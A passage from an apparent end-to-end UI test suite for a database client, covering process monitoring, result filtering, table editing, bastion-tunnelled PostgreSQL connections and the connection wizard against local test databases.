    const connection = (await invoke("list_connections")).find((item) => item.name === "MySQL (Docker)");
    const session = "e2e-process-confirmation";
    try {
      const outcome = await invoke("connect", { session, connection: connection.id, password: "spelaion", remember: false, editor: false });
      if (outcome.kind !== "connected") throw new Error(`unexpected connection outcome: ${outcome.kind}`);
      const snapshot = await invoke("list_processes", { session });
      const row = snapshot.processes.find((item) => item.id === snapshot.ownId);
      const target = { id: row.id, user: row.user, host: row.host, command: row.command, sql: row.sql, identity: row.identity };
      try {
        await invoke("control_process", { session, target, terminate: true, confirmed: false });
        return "no error";
      } catch (error) { return String(error); }
    } finally {
      await invoke("disconnect", { session });
    }
  });
  assert.match(unconfirmedError, /confirmation is required/);
  await monitor.getByLabel("Search processes…").fill("no-such-process-marker");
  await monitor.getByText("No processes match these filters.").waitFor();
  await monitor.getByLabel("Search processes…").fill("");
  await monitor.getByLabel("Database", { exact: true }).selectOption({ label: "No database" });
  await monitor.getByLabel("Database", { exact: true }).selectOption("");
  await monitor.getByLabel("Auto refresh").selectOption("5");
  await monitor.getByLabel("Auto refresh").selectOption("0");
  await monitor.getByRole("button", { name: "Refresh", exact: true }).click();
  await monitor.locator(".process-table tbody tr").first().waitFor();
  await shot("07b-process-monitor");
  await processSidebar.getByRole("button", { name: "MariaDB (Docker)", exact: true }).click();
  await monitor.getByRole("heading", { name: "MariaDB (Docker)" }).waitFor();
  await monitor.locator(".process-table tbody tr:has(.process-own)").waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0, "the monitor reuses the connected tab's credentials");
  await processSidebar.getByRole("button", { name: "Postgres (Docker)", exact: true }).click();
  await monitor.getByRole("heading", { name: "Postgres (Docker)" }).waitFor();
  await monitor.locator(".process-table tbody tr:has(.process-own)").click();
  await monitor.getByText("PostgreSQL may truncate the SQL it reports.").waitFor();
  assert.ok(await monitor.getByRole("button", { name: "End connection" }).isDisabled());
  await monitor.getByLabel("State", { exact: true }).selectOption("idle");
  await monitor.locator(".process-table tbody tr").first().waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0, "PostgreSQL credentials are reused");
  await activities.getByRole("button", { name: "Connections", exact: true }).click();
  assert.equal(await panel.locator(".cm-content").innerText(), currentSqlBeforeMonitor);
  // SQLyog-style column filters on SHOW FULL PROCESSLIST (no WHERE possible there).
  panel = await newQuery("MySQL (Docker)", "show full processlist;");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for MySQL (Docker)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: /\d+ rows? ·/ }).waitFor();
  const processlistTotal = Number((await panel.locator(".statusline").innerText()).match(/(\d+) rows?/)[1]);
  // The filter bar moves the grid down: its box is read before every right-click.
  const rightClickFirstCell = async () => {
    const box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(box.x + 80, box.y + 36 + 13, { button: "right" });
  };
  const filterBy = async (op, value) => {
    await rightClickFirstCell();
    await panel.getByRole("menuitem", { name: "Filter ▸" }).hover();
    await panel.getByRole("menuitem", { name: "Custom filter…" }).click();
    const dialog = page.getByRole("dialog", { name: "Custom filter" });
    await dialog.getByLabel("Column").selectOption({ label: "Command" });
    await dialog.getByLabel("Operator").selectOption({ label: op });
    await dialog.getByLabel("Value").fill(value);
    await dialog.getByRole("button", { name: "Filter", exact: true }).click();
    await dialog.waitFor({ state: "detached" });
  };
  const shownOf = async () => {
    const text = await panel.locator(".statusline").innerText();
    const m = text.match(/(\d+) of (\d+) rows?/);
    return m ? [Number(m[1]), Number(m[2])] : null;
  };
  await filterBy("<>", "Sleep");
  await panel.locator(".filter-chip", { hasText: "Command <> 'Sleep'" }).waitFor();
  await panel.locator(".statusline", { hasText: " of " }).waitFor();
  const [busy, total] = await shownOf();
  assert.equal(total, processlistTotal);
  assert.ok(busy >= 1, "this query is running");
  await shot("07c-processlist-filtered");
  await panel.getByRole("button", { name: "Remove the filter Command <> 'Sleep'" }).click();
  await panel.locator(".filter-chip").waitFor({ state: "detached" });
  await filterBy("=", "sleep");
  await panel.locator(".filter-chip", { hasText: "Command = 'sleep'" }).waitFor();
  await panel.locator(".statusline", { hasText: " of " }).waitFor();
  const [sleeping] = await shownOf();
  assert.equal(sleeping + busy, processlistTotal);
  // From the cell's own menu: the filter for its value, then reset.
  await rightClickFirstCell();
  await panel.getByRole("menuitem", { name: "Filter ▸" }).hover();
  await panel.getByRole("menuitem", { name: /^Id <> \d+$/ }).click();
  await panel.locator(".filter-chip").nth(1).waitFor();
  await panel.getByRole("button", { name: "Reset filters" }).click();
  await panel.locator(".filter-chip").first().waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: `${processlistTotal} row` }).waitFor();

  step("MySQL query pages: block fetching while there are unsaved edits");
  const pageValues = Array.from({ length: 230 }, (_, i) => `(${i + 1})`).join(", ");
  await replaceQuery(panel, `create table if not exists smoke_pages (id int primary key); delete from smoke_pages where id > 0; insert into smoke_pages values ${pageValues};`);
  await run(panel);
  await panel.getByText("Statement 3: 230 rows", { exact: false }).waitFor();
  await replaceQuery(panel, "select * from smoke_pages order by id;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "230 rows" }).waitFor();
  let mysqlPages = panel.getByRole("group", { name: "Query result pages" });
  const firstMysqlResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await mysqlPages.getByLabel("Rows per page").selectOption("100");
  await page.waitForFunction((el) => !el.isConnected, firstMysqlResult);
  await panel.locator(".statusline", { hasText: "100 rows" }).waitFor();
  await panel.getByRole("button", { name: "Add row" }).waitFor();
  const mysqlGrid = panel.locator(".grid-scroller");
  const mysqlBox = await mysqlGrid.boundingBox();
  await page.mouse.dblclick(mysqlBox.x + 52 + 20, mysqlBox.y + 36 + 13);
  await panel.getByRole("textbox", { name: "New value for id" }).fill("901");
  await panel.getByRole("textbox", { name: "New value for id" }).press("Enter");
  assert.ok(await mysqlPages.getByLabel("Rows per page").isDisabled());
  await mysqlGrid.evaluate((el) => { el.scrollTop = el.scrollHeight; });
  await page.waitForTimeout(300);
  await panel.locator(".statusline", { hasText: "100 rows" }).waitFor();
  await panel.getByRole("button", { name: "Discard" }).click();
  await mysqlGrid.evaluate((el) => { el.scrollTop = 0; });
  await mysqlGrid.evaluate((el) => { el.scrollTop = el.scrollHeight; });
  await panel.locator(".statusline", { hasText: "200 rows" }).waitFor();
  await mysqlPages.getByRole("button", { name: "Count", exact: true }).click();
  await mysqlPages.getByText(/of 230/).waitFor();

  // A table of the test server to edit (never the demo database).
  await replaceQuery(
    panel,
    "create table if not exists smoke_edit (id int primary key, name varchar(20), qty int default 1);\n" +
      "delete from smoke_edit where id > 0;\n" +
      "insert into smoke_edit values (1, 'one', 1), (2, 'two', 2), (3, 'three', 3);",
  );
  await run(panel);
  await panel.getByText("Statement 3: 3 rows", { exact: false }).waitFor();

  // The explorer lists MySQL databases and their tables.
  // Its own session ("ask every time"): the password is asked again.
  await page.locator('.connection-row:has-text("MySQL (Docker)") .twisty').click();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await page.getByRole("button", { name: "Expand or collapse schema spelaion" }).waitFor();
  assert.ok(await page.locator('.connection-row:has-text("MySQL (Docker)") img.engine-icon').evaluate((icon) => icon.complete && icon.naturalWidth > 0));
  await connectionsActivity.click();
  await sidebar.waitFor({ state: "hidden" });
  await connectionsActivity.click();
  await page.getByRole("button", { name: "Expand or collapse schema spelaion" }).waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0);
  // System schemas only when asked for, in Settings → Explorer (a personal preference).
  const systemSchema = page.getByRole("button", { name: "Expand or collapse schema information_schema" });
  assert.equal(await systemSchema.count(), 0);
  const setShowSystem = (checked) =>
    withSettings("explorer", async (settings) => {
      const box = settings.locator('input[name="showSystem"]');
      await box.setChecked(checked);
      await page.waitForFunction(([want]) => {
        const input = document.querySelector('input[name="showSystem"]');
        return input?.checked === want && !input.disabled;
      }, [checked]);
    });
  await setShowSystem(true);
  await systemSchema.first().waitFor();
  // Alphabetical by default; without it, the database's order (MySQL's system schemas last).
  // The test user only sees the schemas it has privileges on.
  const mysqlNode = page.locator(".node", { has: page.locator('.connection-row:has-text("MySQL (Docker)")') }).first();
  const schemaOrder = () =>
    mysqlNode.locator('[aria-label^="Expand or collapse schema "]').evaluateAll((rows) =>
      rows.map((row) => row.getAttribute("aria-label").replace("Expand or collapse schema ", "")),
    );
  assert.deepEqual(await schemaOrder(), ["information_schema", "performance_schema", "spelaion"]);
  const setExplorerBox = (name, checked) =>
    withSettings("explorer", async (settings) => {
      await settings.locator(`input[name="${name}"]`).setChecked(checked);
      await page.waitForFunction(([n, want]) => {
        const input = document.querySelector(`input[name="${n}"]`);
        return input?.checked === want && !input.closest("fieldset").disabled;
      }, [name, checked]);
    });
  await setExplorerBox("sortAlphabetically", false);
  assert.deepEqual(await schemaOrder(), ["spelaion", "information_schema", "performance_schema"]);
  await setExplorerBox("sortAlphabetically", true);
  await setShowSystem(false);
  await systemSchema.first().waitFor({ state: "detached" });

  step("explorer: open a connected query for the selected database without asking again");
  await page.locator('.connection-row:has-text("MySQL (Docker)") .label').dblclick();
  await panel.locator(".status-connected").waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0);
  const mysqlSchema = page.getByRole("button", { name: "Expand or collapse schema spelaion" });
  await mysqlSchema.dblclick();
  await panel.locator(".status-connected").waitFor();
  const selectedDatabase = panel.getByLabel("Database", { exact: true });
  await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await selectedDatabase.elementHandle());
  assert.equal(await page.getByRole("dialog").count(), 0);
  await panel.locator(".cm-content").click();
  await page.keyboard.insertText("select 1 where database() = 'spelaion';");
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  // "Set as the editor's schema" switches the active tab's database back.
  await selectedDatabase.selectOption("information_schema");
  await page.waitForFunction((el) => !el.disabled && el.value === "information_schema", await selectedDatabase.elementHandle());
  await mysqlSchema.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Set as the editor's schema" }).click();
  await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await selectedDatabase.elementHandle());
  // "Generate CALL" on a procedure: its IN parameter as a placeholder, its OUT one collected.
  await replaceQuery(panel, "create procedure if not exists smoke_call(in a int, out b int) set b = a + 1;\nselect 2 as done union all select 3;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "2 rows" }).waitFor();
  if ((await mysqlSchema.getAttribute("aria-expanded")) !== "true") await mysqlSchema.click();
  await mysqlSchema.focus();
  await page.keyboard.press("F5");
  const mysqlProcedures = mysqlSchema.locator("xpath=..").getByRole("button", { name: "Expand or collapse Procedures", exact: true });
  await mysqlProcedures.click();
  await page.getByRole("button", { name: "smoke_call: open its definition", exact: true }).click({ button: "right" });
  await page.getByRole("menuitem", { name: "Generate CALL" }).click();
  await panel.locator(".cm-content", { hasText: "CALL `spelaion`.`smoke_call`" }).waitFor();
  assert.equal((await panel.locator(".cm-content").innerText()).trimEnd(), "CALL `spelaion`.`smoke_call`(:a, @b);\nSELECT @b AS `b`;");
  await mysqlProcedures.click();

  step("editing table data: cells, NULL, delete and insert applied in one transaction");
  if ((await mysqlSchema.getAttribute("aria-expanded")) !== "true") await mysqlSchema.click();
  const mysqlTables = mysqlSchema.locator("xpath=..").getByRole("button", { name: "Expand or collapse Tables", exact: true });
  if ((await mysqlTables.getAttribute("aria-expanded")) !== "true") await mysqlTables.click();
  const smokeEditNode = page.getByRole("button", { name: "Expand or collapse smoke_edit", exact: true });
  const estimate = smokeEditNode.locator('[title^="Estimated rows (from the planner, not counted): "]');
  await estimate.waitFor();
  assert.match(await estimate.innerText(), /^~\d/);
  // The MySQL forms prepare constraints and foreign keys in the SQL editor.
  await smokeEditNode.locator(".twisty").click();
  const mysqlDetails = smokeEditNode.locator("xpath=..");
  await mysqlDetails.getByRole("button", { name: "Expand or collapse Columns", exact: true }).locator(".label").dblclick();
  const mysqlColumnsView = page.getByRole("region", { name: "Columns of smoke_edit" });
  await mysqlColumnsView.getByRole("button", { name: "Add…" }).click();
  const mysqlColumnForm = page.getByRole("dialog", { name: "Add to Columns of smoke_edit" });
  await mysqlColumnForm.getByLabel("Name", { exact: true }).fill("new_counter");
  const mysqlDataType = mysqlColumnForm.getByRole("combobox", { name: "Data type", exact: true });
  assert.equal(await mysqlDataType.locator('option[value="VARCHAR(255)"]').count(), 1);
  assert.equal(await mysqlDataType.locator('option[value="JSONB"]').count(), 0);
  await mysqlDataType.selectOption("__custom__");
  await mysqlColumnForm.getByLabel("Custom data type").fill("BIGINT UNSIGNED");
  await mysqlColumnForm.getByRole("button", { name: "Open SQL" }).click();
  await panel.locator(".cm-content", { hasText: "`new_counter` BIGINT UNSIGNED" }).waitFor();
  await page.keyboard.press("Control+w");
  await mysqlColumnsView.waitFor();
  await page.keyboard.press("Control+w");
  for (const section of ["Constraints", "Foreign keys"]) {
    await mysqlDetails.getByRole("button", { name: `Expand or collapse ${section}`, exact: true }).locator(".label").dblclick();
    const view = page.getByRole("region", { name: `${section} of smoke_edit` });
    await view.getByRole("button", { name: "Add…" }).click();
    const form = page.getByRole("dialog", { name: `Add to ${section} of smoke_edit` });
    await form.getByLabel("Name", { exact: true }).fill(section === "Constraints" ? "smoke_unique" : "smoke_fk");
    await form.locator("fieldset").getByLabel(section === "Constraints" ? "name" : "id", { exact: true }).check();
    if (section === "Foreign keys") {
      await form.getByLabel("Referenced table").fill("smoke_pages");
      await form.getByLabel("Referenced columns", { exact: false }).fill("id");
      await shot("05f-add-foreign-key-form");
    }
    await form.getByRole("button", { name: "Open SQL" }).click();
    await panel.locator(".cm-content", { hasText: section === "Constraints" ? "UNIQUE (`name`)" : "REFERENCES `spelaion`.`smoke_pages` (`id`)" }).waitFor();
    await page.keyboard.press("Control+w");
    await view.waitFor();
    await page.keyboard.press("Control+w");
  }
  await smokeEditNode.locator(".twisty").click();
  await smokeEditNode.dblclick();
  await page.locator(".tabbar .tab.active", { hasText: "smoke_edit" }).waitFor();
  await panel.locator(".status-connected").waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0);
  await panel.locator(".table-range", { hasText: "rows 1–3" }).waitFor();
  await panel.getByRole("button", { name: "Add row" }).waitFor();
  await panel.getByRole("textbox", { name: "ORDER BY" }).fill("id");
  await panel.getByRole("button", { name: "Apply", exact: true }).click();
  await panel.locator(".table-range", { hasText: "rows 1–3" }).waitFor();
  {
    let box = null;
    for (let i = 0; i < 40 && !box; i++) {
      box = await panel.locator(".grid-scroller").boundingBox();
      if (!box) await page.waitForTimeout(100);
    }
    // Read the grid's place each time: nothing above it may move, but if it does the
    // clicks still land on the intended cell.
    const cellAt = async (row, x) => {
      const now = await panel.locator(".grid-scroller").boundingBox();
      return [now.x + 52 + x + 20, now.y + 36 + 13 + row * 26];
    };
    // name of row 1 → "edited" (inline editor).
    await page.mouse.dblclick(...(await cellAt(0, 110)));
    const editor = panel.getByRole("textbox", { name: "New value for name" });
    await editor.fill("edited");
    await editor.press("Enter");
    // The full value panel edits the same pending cell, and can be undone by row.
    await page.keyboard.press("Enter");
    const viewer = panel.locator(".cell-viewer");
    const fullValue = viewer.getByRole("textbox", { name: "New value for name" });
    await viewer.getByText("Edit value", { exact: true }).waitFor();
    await fullValue.fill("edited from viewer");
    await viewer.getByText("Change pending; save it from the results toolbar.").waitFor();
    await viewer.getByRole("button", { name: "Close the cell viewer (Esc)" }).click();
    // Duplicating a row copies its pending values but leaves the key for the new row.
    await page.keyboard.press("Control+Alt+Insert");
    const duplicate = page.getByRole("dialog", { name: "New row" });
    assert.equal(await duplicate.getByRole("textbox", { name: "name", exact: true }).inputValue(), "edited from viewer");
    assert.equal(await duplicate.getByRole("textbox", { name: "id", exact: true }).inputValue(), "");
    await duplicate.getByRole("textbox", { name: "id", exact: true }).fill("5");
    await duplicate.getByRole("button", { name: "Add", exact: true }).click();
    await panel.locator(".grid-scroller").focus();
    await page.keyboard.press("Alt+Insert");
    await page.getByRole("dialog", { name: "New row" }).getByRole("button", { name: "Add", exact: true }).click();
    await panel.getByRole("button", { name: "Discard new row 2" }).click();
    // qty of row 2 → NULL (shortcut).
    await page.mouse.click(...(await cellAt(1, 270)));
    await page.keyboard.press("Control+Alt+n");
    // row 3 deleted (Alt+Del).
    await page.mouse.click(...(await cellAt(2, 0)));
    await page.keyboard.press("Alt+Delete");
    // A new row with id 4; qty takes its default.
    await panel.getByRole("button", { name: "Add row" }).click();
    const newRow = page.getByRole("dialog", { name: "New row" });
    await newRow.getByRole("textbox", { name: "id", exact: true }).fill("4");
    await newRow.getByRole("textbox", { name: "name", exact: true }).fill("four");
    await newRow.getByRole("button", { name: "Add", exact: true }).click();
    await panel.getByText("Inserted: 2 · Deleted: 1 · Updated: 2").waitFor();
    assert.ok(await panel.getByRole("button", { name: "Next page" }).isDisabled());
    await shot("07d-editing-pending");
    await panel.getByRole("button", { name: "Save changes" }).click();
    await panel.getByRole("status").filter({ hasText: "Applied 5 changes" }).waitFor();
    await panel.locator(".table-range", { hasText: "rows 1–4" }).waitFor();
    for (let i = 0; i < 40 && !(box = await panel.locator(".grid-scroller").boundingBox()); i++) await page.waitForTimeout(100);
    const before = await page.evaluate(() => window.__copied.length);
    await page.mouse.click(box.x + 52 + 20, box.y + 36 + 13);
    await page.keyboard.press("Control+a");
    await page.keyboard.press("Control+c");
    assert.deepEqual((await copied(before + 1)).trimEnd().split("\n"), ["1\tedited from viewer\t1", "2\ttwo\t", "4\tfour\t1", "5\tedited from viewer\t1"]);
  }
  // Saving directly from an active cell commits its current input as well as other changes.
  {
    const box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.dblclick(box.x + 52 + 110 + 20, box.y + 36 + 13);
    const editor = panel.getByRole("textbox", { name: "New value for name" });
    await editor.fill("saved by shortcut");
    await editor.press("Control+s");
    await panel.getByRole("status").filter({ hasText: "Applied 1 change" }).waitFor();
    await panel.locator(".table-range", { hasText: "rows 1–4" }).waitFor();
    assert.equal(await page.getByRole("dialog", { name: "Save query" }).count(), 0);
    const after = await panel.locator(".grid-scroller").boundingBox();
    const before = await page.evaluate(() => window.__copied.length);
    await page.mouse.click(after.x + 52 + 110 + 20, after.y + 36 + 13);
    await page.keyboard.press("Control+c");
    assert.equal((await copied(before + 1)).trimEnd(), "saved by shortcut");
  }
  // A typed value that does not fit the column is refused by the core; nothing is applied.
  {
    const box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.dblclick(box.x + 52 + 270 + 20, box.y + 36 + 13);
    const editor = panel.getByRole("textbox", { name: "New value for qty" });
    await editor.fill("123");
    await editor.press("Enter");
    await page.keyboard.press("Control+z");
    await panel.getByText("No pending changes").waitFor();
    await page.mouse.dblclick(box.x + 52 + 270 + 20, box.y + 36 + 13);
    await editor.fill("lots");
    await editor.press("Enter");
    await panel.getByRole("button", { name: "Save changes" }).click();
    await panel.getByRole("alert").filter({ hasText: "is not a whole number" }).waitFor();
    await page.keyboard.press("Control+r");
    await panel.getByText("No pending changes").waitFor();
  }
  await page.keyboard.press("Control+w");

  step("editing a simple query result, while joins stay read-only");
  await mysqlSchema.dblclick();
  panel = page.locator(".tab-panel:not([hidden])");
  await panel.locator(".status-connected").waitFor();
  const queryDatabase = panel.getByLabel("Database", { exact: true });
  await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await queryDatabase.elementHandle());
  await panel.locator(".cm-content").click();
  await page.keyboard.insertText("select id, name from smoke_edit order by id;");
  await run(panel);
  await panel.getByRole("toolbar", { name: "Row actions" }).waitFor();
  {
    const box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.dblclick(box.x + 52 + 110 + 20, box.y + 36 + 13);
    const editor = panel.getByRole("textbox", { name: "New value for name" });
    await editor.fill("query edit");
    await editor.press("Enter");
    await page.keyboard.press("Enter");
    const valueEditor = panel.locator(".cell-viewer").getByRole("textbox", { name: "New value for name" });
    await valueEditor.fill("viewer shortcut");
    const valueBar = panel.locator(".cell-viewer").getByRole("toolbar", { name: "Value actions" });
    assert.ok((await valueBar.boundingBox()).y >= (await valueEditor.boundingBox()).y + (await valueEditor.boundingBox()).height, "the value actions are below the editor");
    const beforeSave = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
    await valueEditor.press("Control+s");
    await panel.getByRole("status").filter({ hasText: "Applied 1 change" }).waitFor();
    await page.waitForFunction((el) => !el.isConnected, beforeSave);
    await panel.getByRole("toolbar", { name: "Row actions" }).waitFor();
    const updated = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(updated.x + 52 + 110 + 20, updated.y + 36 + 13);
    await page.keyboard.press("Enter");
    await panel.locator(".cell-viewer").getByRole("textbox", { name: "New value for name" }).waitFor();
    assert.equal(await panel.locator(".cell-viewer textarea").inputValue(), "viewer shortcut");
  }
  await panel.locator(".cm-content").click();
  await page.keyboard.press("Control+a");
  await page.keyboard.insertText("select * from smoke_edit a join smoke_edit b on a.id = b.id;");
  const previousEditResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await run(panel);
  await page.waitForFunction((el) => !el.isConnected, previousEditResult);
  await panel.locator(".statusline", { hasText: "4 rows" }).waitFor();
  assert.equal(await panel.getByRole("toolbar", { name: "Row actions" }).count(), 0);
  const joinPages = panel.getByRole("group", { name: "Query result pages" });
  await joinPages.getByRole("button", { name: "Count", exact: true }).click();
  await joinPages.getByText("rows 1–4 of 4").waitFor();
  await page.keyboard.press("Control+w");
  if (process.env.SPELAION_E2E_EDIT_ONLY === "1") throw editSmokeComplete;

  step("PostgreSQL behind two bastions with TLS verify-full");
  panel = await newQuery(
    "Postgres behind bastions",
    "select inet_server_addr()::text as server, ssl, version, cipher\nfrom pg_stat_ssl\nwhere pid = pg_backend_pid();",
  );
  await run(panel);
  // First the password (the keychain does not have it yet, so it offers to remember it); then,
  // when the tunnel opens, the fingerprint of each bastion.
  await page.getByRole("dialog").getByText("Password for Postgres behind bastions").waitFor();
  // Offered, and left unticked: the smoke test never writes the user's real keychain.
  await page.getByRole("checkbox", { name: "Remember in the system keychain" }).uncheck();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  for (let hop = 1; hop <= 2; hop++) {
    await page.getByRole("dialog").getByText(`(hop ${hop})`).waitFor();
    if (hop === 1) await shot("08-ssh-fingerprint");
    await page.getByRole("button", { name: "Trust and remember" }).click();
  }
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  await panel.locator(".toolbar .type-badge.badge-prod", { hasText: "PRODUCTION" }).waitFor();
  await shot("09-bastions");
  // Production has smart commit (ADR-031): reads stay in auto-commit, the first change opens a
  // transaction that waits for Commit or Rollback, then the tab is back in auto-commit.
  const prodAutoCommit = panel.locator(".transaction-controls").getByRole("checkbox", { name: /Auto-commit/ });
  await panel.locator(".transaction-controls .smart", { hasText: "smart" }).waitFor();
  assert.ok(await prodAutoCommit.isChecked());
  await replaceQuery(panel, "create temp table smart_tx (id int);");
  await run(panel);
  const prodRisk = page.getByRole("dialog", { name: "Run these statements?" });
  await prodRisk.getByRole("button", { name: "Run anyway" }).click();
  await prodRisk.waitFor({ state: "detached" });
  await panel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
  assert.ok(!(await prodAutoCommit.isChecked()));
  await shot("09a-smart-commit");
  await panel.getByRole("button", { name: "Rollback", exact: true }).click();
  await panel.locator(".tx-badge").waitFor({ state: "detached" });
  await page.waitForFunction(() => document.querySelector(".tab-panel:not([hidden]) .transaction-controls input[type=checkbox]")?.checked === true);

  step("add connection: catalog by category, test and save (personal, nothing in the repo)");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  let wizard = page.getByRole("dialog", { name: "Add connection" });
  await wizard.getByRole("heading", { name: "Relational" }).waitFor();
  await wizard.getByRole("heading", { name: "NoSQL" }).waitFor();
  assert.ok(!(await wizard.locator(".engine-card", { hasText: "MySQL" }).isDisabled()));
  assert.ok(!(await wizard.locator(".engine-card", { hasText: "MariaDB" }).isDisabled()));
  assert.ok(!(await wizard.locator(".engine-card", { hasText: "SQL Server" }).isDisabled()));
  assert.ok(!(await wizard.locator(".engine-card", { hasText: "DuckDB" }).isDisabled()));
  assert.ok(await wizard.locator(".engine-card", { hasText: "Oracle" }).isDisabled());
  await wizard.locator(".engine-card", { hasText: "Oracle" }).getByText("Coming soon").waitFor();
  await shot("12a-add-connection-catalog");
  // A connection URL fills the form (password included, only in the form), then back.
  await wizard.getByRole("textbox", { name: "Or paste a connection URL" }).fill("jdbc:mysql://reports.example.com:3307/sales?user=reader&password=s%26cret&sslMode=VERIFY_IDENTITY");
  await wizard.getByRole("button", { name: "Use URL" }).click();
  let urlForm = page.locator(".modal.wizard");
  await urlForm.getByRole("heading", { name: "New MySQL connection" }).waitFor();
  assert.equal(await urlForm.getByLabel("Host", { exact: true }).inputValue(), "reports.example.com");
  assert.equal(await urlForm.getByLabel("Port", { exact: true }).inputValue(), "3307");
  assert.equal(await urlForm.getByLabel("Database", { exact: true }).inputValue(), "sales");
  assert.equal(await urlForm.getByLabel("User", { exact: true }).inputValue(), "reader");
  assert.equal(await urlForm.getByLabel("Password", { exact: true }).inputValue(), "s&cret");
  assert.equal(await urlForm.getByLabel("Name", { exact: true }).inputValue(), "sales");
  await shot("12a1-connection-url");
  await urlForm.getByRole("button", { name: "Back", exact: true }).click();
  wizard = page.getByRole("dialog", { name: "Add connection" });
  await wizard.getByRole("textbox", { name: "Or paste a connection URL" }).fill("redis://cache:6379");
  await wizard.getByRole("button", { name: "Use URL" }).click();
  await wizard.getByRole("alert").filter({ hasText: "not a connection URL" }).waitFor();
  await wizard.getByRole("searchbox").fill("lite");
  assert.equal(await wizard.locator(".engine-card").count(), 1);
  await wizard.locator(".engine-card", { hasText: "SQLite" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "New SQLite connection" }).waitFor();
  // SQLite has no SSL tab; SSH is for a file on a server (ADR-018).
  assert.deepEqual(await wizard.getByRole("tab").allTextContents(), ["Main", "SSH", "Options"]);
  await wizard.getByLabel("Name", { exact: true }).fill("Shop copy");
  await wizard.getByLabel("File", { exact: true }).fill(join(demo, "data", "shop.db"));
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  // A description over two lines: the tooltip of the connection, written to its file.
  const shopCopyDescription = "Copy of the demo shop.\nFor trying things out.";
  await wizard.getByLabel("Description", { exact: true }).fill(`  ${shopCopyDescription}\n`);
  // Tags as chips: a comma or Enter adds one, a repeat in another case is not added twice.
  // A box with suggestions (`list`) is a combobox.
  const tagBox = wizard.getByRole("combobox", { name: "Tags", exact: true });
  await tagBox.pressSequentially("demo,");
  await tagBox.fill("Testing");
  await tagBox.press("Enter");
  await tagBox.fill("DEMO");
  await tagBox.press("Enter");
  assert.deepEqual(await wizard.locator(".tag-chip").allTextContents(), ["demo×", "Testing×"]);
  // Enter in the tag box added a tag: it did not submit the form.
  await wizard.getByRole("heading", { name: "New SQLite connection" }).waitFor();
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 3\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "Shop copy" }).waitFor();
  assert.equal(
    await page.locator(".connection-row", { hasText: "Shop copy" }).locator(".label").getAttribute("title"),
    `${shopCopyDescription}\n\n~/shop-copy\nTags: demo, Testing`,
  );
  const shopCopyFile = readFileSync(join(userDir, "connections", "shop-copy.toml"), "utf8");
  assert.match(shopCopyFile, /Copy of the demo shop\.\nFor trying things out\./);
  assert.match(shopCopyFile, /tags = \[\s*"demo",\s*"Testing",?\s*\]/);
  // Tags next to the name; a click filters the explorer to the connections that have it.
  const shopCopyRow = page.locator(".connection-row", { hasText: "Shop copy" });
  assert.deepEqual(await shopCopyRow.locator(".connection-tag").allTextContents(), ["#demo", "#Testing"]);
  const allConnections = await page.locator(".connection-row").count();
  assert.ok(allConnections > 1);
  await shopCopyRow.locator(".connection-tag", { hasText: "#demo" }).click();
  const tagFilter = page.getByRole("group", { name: "Filter connections by tag" });
  await tagFilter.getByRole("button", { name: "#demo" }).waitFor();
  assert.equal(await tagFilter.getByRole("button", { name: "#demo" }).getAttribute("aria-pressed"), "true");
  assert.equal(await tagFilter.getByRole("button", { name: "#Testing" }).getAttribute("aria-pressed"), "false");
  for (let i = 0; i < 40 && (await page.locator(".connection-row").count()) !== 1; i++) await page.waitForTimeout(50);
  assert.deepEqual(await page.locator(".connection-row .label").allTextContents(), ["Shop copy"]);
  await shot("12a0-filter-by-tag");
  // Off again from the filter's chip; closing the quick filter forgets the tags.
  await tagFilter.getByRole("button", { name: "#demo" }).click();
  for (let i = 0; i < 40 && (await page.locator(".connection-row").count()) !== allConnections; i++) await page.waitForTimeout(50);
  assert.equal(await page.locator(".connection-row").count(), allConnections);
  await tagFilter.getByRole("button", { name: "#Testing" }).click();
  assert.deepEqual(await page.locator(".connection-row .label").allTextContents(), ["Shop copy"]);
  await page.getByRole("button", { name: "Filter the explorer", exact: true }).click();
  await tagFilter.waitFor({ state: "detached" });
  assert.equal(await page.locator(".connection-row").count(), allConnections);
  panel = await newQuery("Shop copy", "select count(*) as n from product;");
  assert.equal(
    await panel.locator("select").first().locator("option", { hasText: "Shop copy" }).getAttribute("title"),
    `${shopCopyDescription}\n\n~/shop-copy`,
  );
  assert.equal(await panel.locator("select").first().getAttribute("title"), `${shopCopyDescription}\n\n~/shop-copy`);
  await run(panel);
